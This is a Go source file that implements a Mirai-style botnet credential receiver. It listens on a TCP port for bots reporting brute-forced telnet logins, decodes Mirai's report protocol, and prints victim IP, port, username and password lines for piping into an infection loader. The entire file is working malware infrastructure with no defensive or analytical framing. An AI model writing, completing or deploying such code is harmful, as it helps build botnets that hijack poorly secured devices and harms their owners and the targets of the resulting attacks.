// scan.go — credential receiver (scanListen equivalent).
//
// Listens on a port (default 48101) for bots reporting brute-forced
// telnet credentials. Outputs "ip:port user:pass" lines to stdout,
// which can be piped directly into the loader.
//
// Protocol (same as Mirai's scanListen.go):
//   [1 byte]   check — 0 = 4-byte IP follows, non-zero = 3-byte IP + this byte as MSB
//   [4 or 3 bytes] IPv4 address (big-endian)
//   [2 bytes]  port (big-endian, only if check == 0; else defaults to 23)
//   [1 byte]   username_len
//   [N bytes]  username
//   [1 byte]   password_len
//   [N bytes]  password

package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"time"
)

// StartScanListener begins accepting credential reports on the given port.
// Reports are printed to stdout in "ip:port user:pass" format.
// Call this as a goroutine from main.
func StartScanListener(port int) {
	addr := fmt.Sprintf("0.0.0.0:%d", port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Printf("[!] scan listener failed to bind %s: %v", addr, err)
		return
	}
	log.Printf("[+] scan listener on %s (credential receiver)", addr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			// Listener may be closed during shutdown.
			log.Printf("[!] scan listener accept error: %v", err)
			return
		}
		go handleScanReport(conn)
	}
}

func handleScanReport(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	// --- read check byte ---
	check := make([]byte, 1)
	if _, err := io.ReadFull(conn, check); err != nil {
		return
	}

	var ip uint32
	var port uint16

	if check[0] == 0 {
		// 4-byte IP follows.
		ipBytes := make([]byte, 4)
		if _, err := io.ReadFull(conn, ipBytes); err != nil {
			return
		}
		ip = binary.BigEndian.Uint32(ipBytes)

		// 2-byte port follows.
		portBytes := make([]byte, 2)
		if _, err := io.ReadFull(conn, portBytes); err != nil {
			return
		}
		port = binary.BigEndian.Uint16(portBytes)
	} else {
		// 3-byte IP follows; check byte is the MSB.
		ipBytes := make([]byte, 3)
		if _, err := io.ReadFull(conn, ipBytes); err != nil {
			return
		}
		ip = (uint32(check[0]) << 24) |
			(uint32(ipBytes[0]) << 16) |
			(uint32(ipBytes[1]) << 8) |
			uint32(ipBytes[2])
		port = 23 // default telnet port
	}

	// --- read username ---
	userLenByte := make([]byte, 1)
	if _, err := io.ReadFull(conn, userLenByte); err != nil {
		return
	}
	userBytes := make([]byte, userLenByte[0])
	if _, err := io.ReadFull(conn, userBytes); err != nil {
		return
	}

	// --- read password ---
	passLenByte := make([]byte, 1)
	if _, err := io.ReadFull(conn, passLenByte); err != nil {
		return
	}
	passBytes := make([]byte, passLenByte[0])
	if _, err := io.ReadFull(conn, passBytes); err != nil {
		return
	}

	// --- format and output ---
	ipStr := fmt.Sprintf("%d.%d.%d.%d",
		(ip>>24)&0xFF, (ip>>16)&0xFF, (ip>>8)&0xFF, ip&0xFF)

	// Write to stdout for piping to the loader.
	fmt.Printf("%s:%d %s:%s\n",
		ipStr, port,
		string(userBytes), string(passBytes))

	// Also log for visibility.
	log.Printf("[scan] %s:%d  %s:%s",
		ipStr, port,
		string(userBytes), string(passBytes))

	// If stdout is a pipe and we want to ensure delivery immediately:
	os.Stdout.Sync()
}
